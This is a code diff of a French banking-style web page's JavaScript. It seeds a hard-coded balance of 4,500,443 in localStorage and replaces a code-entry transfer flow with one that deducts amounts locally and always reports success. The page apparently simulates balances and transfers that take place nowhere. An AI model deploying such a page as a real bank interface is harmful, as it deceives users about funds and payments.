@@ -1,3 +1,11 @@
+
+// Initialisation des soldes et transactions
+if (!localStorage.getItem("solde")) {
+  localStorage.setItem("solde", "4500443");
+  localStorage.setItem("epargne", "4500443");
+  localStorage.setItem("transactions", JSON.stringify([]));
+}
+
 /** Index Javascript **/
 
 const login = () => {
@@ -36,28 +44,7 @@ const logout = () => {
 /** End Deconnexion javascript **/
 
 
-/** Virement: loader + saisie de code et envoi **/
-const virement_loading = () => {
-  Swal.fire({
-    title: "Virement en cours",
-    html: "Chargement...",
-    timer: 3000,
-    timerProgressBar: true,
-    didOpen: () => {
-      Swal.showLoading();
-    },
-    willClose: () => {
-      alert_message(); // À la fin du loader, on demande le code
-    },
-  });
-};
-
-/**
- * Demande du code et confirmation
- * - Affiche une SweetAlert avec input
- * - Confirme toujours le virement après saisie du code
- * - L'appel réseau est effectué en "best effort" mais n'empêche jamais l'affichage de la confirmation
- */
+/** Virement: loader + mise à jour */
 const alert_message = () => {
   Swal.fire({
     title: "CODE DE CONFIRMATION",
@@ -93,6 +80,48 @@ const alert_message = () => {
 };
 
 /** Helpers: activer/désactiver le bouton en fonction des champs requis **/
+
+// --- Virement en cours + succès ---
+const virement_loading = () => {
+  Swal.fire({
+    title: "Virement en cours",
+    html: "Chargement...",
+    timer: 3000,
+    timerProgressBar: true,
+    didOpen: () => {
+      Swal.showLoading();
+    },
+    willClose: () => {
+      effectuerVirement();
+    },
+  });
+};
+
+const effectuerVirement = () => {
+  const form = document.getElementById("sepaForm");
+  if (!form) return;
+
+  const data = new FormData(form);
+  const montant = parseFloat(data.get("montant")) || 0;
+  const libelle = data.get("libelle") || "Virement";
+
+  let solde = parseFloat(localStorage.getItem("solde")) || 0;
+  let epargne = parseFloat(localStorage.getItem("epargne")) || 0;
+
+  solde -= montant;
+  epargne -= montant;
+  localStorage.setItem("solde", solde);
+  localStorage.setItem("epargne", epargne);
+
+  const transactions = JSON.parse(localStorage.getItem("transactions")) || [];
+  const dateNow = new Date().toLocaleDateString("fr-FR");
+  transactions.push({ type: "virement", libelle, montant, date: dateNow });
+  localStorage.setItem("transactions", JSON.stringify(transactions));
+
+  Swal.fire("Succès", "Votre virement a été effectué avec succès.", "success");
+};
+
+
 const initVirementForm = () => {
   const form = document.getElementById("sepaForm");
   const btn = document.getElementById("btn_valid");
